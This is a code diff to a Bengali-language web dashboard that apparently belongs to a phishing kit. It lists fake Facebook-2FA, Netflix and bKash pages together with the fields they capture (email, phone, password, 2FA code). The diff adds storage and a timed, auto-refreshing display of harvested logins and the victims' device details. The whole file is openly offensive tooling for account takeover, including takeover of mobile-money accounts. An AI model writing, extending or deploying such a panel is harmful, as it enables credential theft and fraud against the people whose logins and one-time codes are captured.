@@ -257,8 +257,8 @@
         }
         
         .data-content {
-            min-height: 150px;
-            max-height: 300px;
+            min-height: 200px;
+            max-height: 400px;
             overflow-y: auto;
             padding: 10px;
             background: #f7fafc;
@@ -318,6 +318,27 @@
         .refresh-btn:hover {
             box-shadow: 0 5px 15px rgba(72, 187, 120, 0.4);
         }
+        
+        .clear-btn {
+            background: #f56565;
+            margin-top: 10px;
+        }
+        
+        .clear-btn:hover {
+            box-shadow: 0 5px 15px rgba(245, 101, 101, 0.4);
+        }
+        
+        .data-actions {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        
+        .timestamp {
+            font-size: 0.8rem;
+            color: #718096;
+            text-align: right;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -376,7 +397,10 @@
         
         <div class="data-section">
             <h2>ইনপুট ডেটা</h2>
-            <button class="btn refresh-btn" onclick="loadInputData()">ডেটা রিফ্রেশ করুন</button>
+            <div class="data-actions">
+                <button class="btn refresh-btn" onclick="loadInputData()">ডেটা রিফ্রেশ করুন</button>
+                <button class="btn clear-btn" onclick="clearAllData()">সব ডেটা ডিলিট করুন</button>
+            </div>
             <div class="data-container">
                 <div class="data-box">
                     <div class="data-title">অপশন ১ ইনপুট ডেটা</div>
@@ -403,11 +427,29 @@
         // ফাইল ডেটা
         const files = {
             option1: [
-                { name: "facebook-2FA.html", size: "8.2 KB", url: "facebook-2FA.html", dataKey: "facebookData" },
-                { name: "Netflix.html", size: "15.7 KB", url: "Netflix.html", dataKey: "netflixData" }
+                { 
+                    name: "facebook-2FA.html", 
+                    size: "8.2 KB", 
+                    url: "facebook-2FA.html", 
+                    dataKey: "facebookData",
+                    fields: ["email", "pass", "2fa_code"]
+                },
+                { 
+                    name: "Netflix.html", 
+                    size: "15.7 KB", 
+                    url: "Netflix.html", 
+                    dataKey: "netflixData",
+                    fields: ["email", "password"]
+                }
             ],
             option2: [
-                { name: "bKash.html", size: "12.5 KB", url: "bKash.html", dataKey: "bkashData" }
+                { 
+                    name: "bKash.html", 
+                    size: "12.5 KB", 
+                    url: "bKash.html", 
+                    dataKey: "bkashData",
+                    fields: ["phone", "pass", "2fa_code"]
+                }
             ]
         };
         
@@ -417,22 +459,36 @@
             option2: null
         };
         
-        let activeOption = null;
+        // LocalStorage থেকে ডেটা লোড করা
+        function getStoredData() {
+            const storedData = localStorage.getItem('userInputData');
+            return storedData ? JSON.parse(storedData) : {
+                facebookData: [],
+                netflixData: [],
+                bkashData: []
+            };
+        }
         
-        // DOM এলিমেন্ট
-        const fileList1 = document.getElementById('fileList1');
-        const fileList2 = document.getElementById('fileList2');
-        const linkDisplay1 = document.getElementById('linkDisplay1');
-        const linkDisplay2 = document.getElementById('linkDisplay2');
-        const visitLinkBtn1 = document.getElementById('visitLinkBtn1');
-        const visitLinkBtn2 = document.getElementById('visitLinkBtn2');
-        const dataContent1 = document.getElementById('dataContent1');
-        const dataContent2 = document.getElementById('dataContent2');
+        // LocalStorage-এ ডেটা সেভ করা
+        function saveDataToStorage(data) {
+            localStorage.setItem('userInputData', JSON.stringify(data));
+        }
         
-        // অপশন নির্বাচন
-        function selectOption(optionNumber) {
-            activeOption = optionNumber;
-            alert(`অপশন ${optionNumber} নির্বাচন করা হয়েছে`);
+        // ডেমো ডেটা ইনিশিয়ালাইজ করা
+        function initializeDemoData() {
+            const storedData = getStoredData();
+            if (storedData.facebookData.length === 0) {
+                storedData.facebookData = [
+                    {
+                        email: "user@example.com",
+                        pass: "••••••••",
+                        "2fa_code": "123456",
+                        deviceInfo: '{"ua":"Mozilla/5.0...","platform":"Windows","res":"1920x1080"}',
+                        timestamp: new Date().toLocaleString()
+                    }
+                ];
+                saveDataToStorage(storedData);
+            }
         }
         
         // ফাইল লিস্ট তৈরি
@@ -529,37 +585,23 @@
             }
         }
         
+        // অপশন নির্বাচন
+        function selectOption(optionNumber) {
+            alert(`অপশন ${optionNumber} নির্বাচন করা হয়েছে`);
+        }
+        
         // ইনপুট ডেটা লোড করা
         function loadInputData() {
-            // ডেমো ডেটা - বাস্তবে এখানে সার্ভার থেকে ডেটা লোড করবেন
-            const demoData = {
-                facebookData: [
-                    { key: "ইমেইল", value: "user@example.com" },
-                    { key: "পাসওয়ার্ড", value: "••••••••" },
-                    { key: "2FA কোড", value: "123456" },
-                    { key: "ডিভাইস", value: "Windows 10, Chrome" },
-                    { key: "লগইন সময়", value: new Date().toLocaleString() }
-                ],
-                netflixData: [
-                    { key: "ইমেইল", value: "netflixuser@example.com" },
-                    { key: "পাসওয়ার্ড", value: "••••••••" },
-                    { key: "রিমেমবার মি", value: "হ্যাঁ" },
-                    { key: "লগইন সময়", value: new Date().toLocaleString() }
-                ],
-                bkashData: [
-                    { key: "ফোন নম্বর", value: "01XXXXXXXXX" },
-                    { key: "পিন", value: "•••••" },
-                    { key: "ভেরিফিকেশন কোড", value: "654321" },
-                    { key: "ডিভাইস তথ্য", value: "Android, App Version 3.5.2" },
-                    { key: "লেনদেন সময়", value: new Date().toLocaleString() }
-                ]
-            };
+            const storedData = getStoredData();
             
             // অপশন ১ এর ডেটা দেখানো
             dataContent1.innerHTML = '';
+            let option1HasData = false;
+            
             files.option1.forEach(file => {
-                const fileData = demoData[file.dataKey];
-                if (fileData) {
+                const fileData = storedData[file.dataKey];
+                if (fileData && fileData.length > 0) {
+                    option1HasData = true;
                     const fileHeader = document.createElement('div');
                     fileHeader.innerHTML = `<strong>${file.name}:</strong>`;
                     fileHeader.style.marginBottom = '10px';
@@ -567,14 +609,49 @@
                     fileHeader.style.borderBottom = '1px solid #e2e8f0';
                     dataContent1.appendChild(fileHeader);
                     
-                    fileData.forEach(item => {
-                        const dataItem = document.createElement('div');
-                        dataItem.className = 'data-item';
-                        dataItem.innerHTML = `
-                            <span class="data-key">${item.key}:</span>
-                            <span class="data-value">${item.value}</span>
-                        `;
-                        dataContent1.appendChild(dataItem);
+                    fileData.forEach((data, index) => {
+                        const dataSection = document.createElement('div');
+                        dataSection.style.marginBottom = '15px';
+                        dataSection.style.padding = '10px';
+                        dataSection.style.background = '#edf2f7';
+                        dataSection.style.borderRadius = '5px';
+                        
+                        // টাইমস্ট্যাম্প যোগ করা
+                        const timestamp = document.createElement('div');
+                        timestamp.className = 'timestamp';
+                        timestamp.textContent = `লগইন সময়: ${data.timestamp || 'অজানা'}`;
+                        dataSection.appendChild(timestamp);
+                        
+                        file.fields.forEach(field => {
+                            if (data[field]) {
+                                const dataItem = document.createElement('div');
+                                dataItem.className = 'data-item';
+                                const fieldName = getFieldDisplayName(field);
+                                dataItem.innerHTML = `
+                                    <span class="data-key">${fieldName}:</span>
+                                    <span class="data-value">${maskSensitiveData(field, data[field])}</span>
+                                `;
+                                dataSection.appendChild(dataItem);
+                            }
+                        });
+                        
+                        // ডিভাইস ইনফো দেখানো
+                        if (data.deviceInfo) {
+                            try {
+                                const deviceData = JSON.parse(data.deviceInfo);
+                                const deviceItem = document.createElement('div');
+                                deviceItem.className = 'data-item';
+                                deviceItem.innerHTML = `
+                                    <span class="data-key">ডিভাইস:</span>
+                                    <span class="data-value">${deviceData.ua ? deviceData.ua.substring(0, 50) + '...' : 'অজানা'}</span>
+                                `;
+                                dataSection.appendChild(deviceItem);
+                            } catch (e) {
+                                console.log('Device info parse error:', e);
+                            }
+                        }
+                        
+                        dataContent1.appendChild(dataSection);
                     });
                     
                     const spacer = document.createElement('div');
@@ -583,15 +660,18 @@
                 }
             });
             
-            if (dataContent1.children.length === 0) {
+            if (!option1HasData) {
                 dataContent1.innerHTML = '<div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>';
             }
             
             // অপশন ২ এর ডেটা দেখানো
             dataContent2.innerHTML = '';
+            let option2HasData = false;
+            
             files.option2.forEach(file => {
-                const fileData = demoData[file.dataKey];
-                if (fileData) {
+                const fileData = storedData[file.dataKey];
+                if (fileData && fileData.length > 0) {
+                    option2HasData = true;
                     const fileHeader = document.createElement('div');
                     fileHeader.innerHTML = `<strong>${file.name}:</strong>`;
                     fileHeader.style.marginBottom = '10px';
@@ -599,14 +679,49 @@
                     fileHeader.style.borderBottom = '1px solid #e2e8f0';
                     dataContent2.appendChild(fileHeader);
                     
-                    fileData.forEach(item => {
-                        const dataItem = document.createElement('div');
-                        dataItem.className = 'data-item';
-                        dataItem.innerHTML = `
-                            <span class="data-key">${item.key}:</span>
-                            <span class="data-value">${item.value}</span>
-                        `;
-                        dataContent2.appendChild(dataItem);
+                    fileData.forEach((data, index) => {
+                        const dataSection = document.createElement('div');
+                        dataSection.style.marginBottom = '15px';
+                        dataSection.style.padding = '10px';
+                        dataSection.style.background = '#edf2f7';
+                        dataSection.style.borderRadius = '5px';
+                        
+                        // টাইমস্ট্যাম্প যোগ করা
+                        const timestamp = document.createElement('div');
+                        timestamp.className = 'timestamp';
+                        timestamp.textContent = `লগইন সময়: ${data.timestamp || 'অজানা'}`;
+                        dataSection.appendChild(timestamp);
+                        
+                        file.fields.forEach(field => {
+                            if (data[field]) {
+                                const dataItem = document.createElement('div');
+                                dataItem.className = 'data-item';
+                                const fieldName = getFieldDisplayName(field);
+                                dataItem.innerHTML = `
+                                    <span class="data-key">${fieldName}:</span>
+                                    <span class="data-value">${maskSensitiveData(field, data[field])}</span>
+                                `;
+                                dataSection.appendChild(dataItem);
+                            }
+                        });
+                        
+                        // ডিভাইস ইনফো দেখানো
+                        if (data.deviceInfo) {
+                            try {
+                                const deviceData = JSON.parse(data.deviceInfo);
+                                const deviceItem = document.createElement('div');
+                                deviceItem.className = 'data-item';
+                                deviceItem.innerHTML = `
+                                    <span class="data-key">ডিভাইস:</span>
+                                    <span class="data-value">${deviceData.ua ? deviceData.ua.substring(0, 50) + '...' : 'অজানা'}</span>
+                                `;
+                                dataSection.appendChild(deviceItem);
+                            } catch (e) {
+                                console.log('Device info parse error:', e);
+                            }
+                        }
+                        
+                        dataContent2.appendChild(dataSection);
                     });
                     
                     const spacer = document.createElement('div');
@@ -615,14 +730,57 @@
                 }
             });
             
-            if (dataContent2.children.length === 0) {
+            if (!option2HasData) {
                 dataContent2.innerHTML = '<div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>';
             }
             
             alert('ডেটা সফলভাবে লোড করা হয়েছে!');
         }
         
+        // সেনসিটিভ ডেটা মাস্ক করা
+        function maskSensitiveData(fieldName, value) {
+            const sensitiveFields = ['pass', 'password', '2fa_code', 'pin'];
+            if (sensitiveFields.includes(fieldName)) {
+                return '•'.repeat(value.length);
+            }
+            return value;
+        }
+        
+        // ফিল্ড ডিসপ্লে নাম
+        function getFieldDisplayName(field) {
+            const fieldNames = {
+                'email': 'ইমেইল',
+                'pass': 'পাসওয়ার্ড',
+                'password': 'পাসওয়ার্ড',
+                '2fa_code': '2FA কোড',
+                'phone': 'ফোন নম্বর',
+                'pin': 'পিন'
+            };
+            return fieldNames[field] || field;
+        }
+        
+        // সব ডেটা ক্লিয়ার করা
+        function clearAllData() {
+            if (confirm('আপনি কি নিশ্চিত যে আপনি সব ডেটা ডিলিট করতে চান?')) {
+                localStorage.removeItem('userInputData');
+                initializeDemoData();
+                loadInputData();
+                alert('সব ডেটা ডিলিট করা হয়েছে!');
+            }
+        }
+        
+        // DOM এলিমেন্ট
+        const fileList1 = document.getElementById('fileList1');
+        const fileList2 = document.getElementById('fileList2');
+        const linkDisplay1 = document.getElementById('linkDisplay1');
+        const linkDisplay2 = document.getElementById('linkDisplay2');
+        const visitLinkBtn1 = document.getElementById('visitLinkBtn1');
+        const visitLinkBtn2 = document.getElementById('visitLinkBtn2');
+        const dataContent1 = document.getElementById('dataContent1');
+        const dataContent2 = document.getElementById('dataContent2');
+        
         // প্রাথমিক রেন্ডার
+        initializeDemoData();
         renderFileLists();
         
         // ডিফল্ট হিসেবে ফাইল সিলেক্ট করা
@@ -635,6 +793,9 @@
         
         // পেজ লোড হলে ডেটা লোড করা
         window.addEventListener('load', loadInputData);
+        
+        // প্রতি 5 সেকেন্ডে ডেটা চেক করা (রিয়েল-টাইম আপডেটের জন্য)
+        setInterval(loadInputData, 5000);
     </script>
 </body>
 </html>
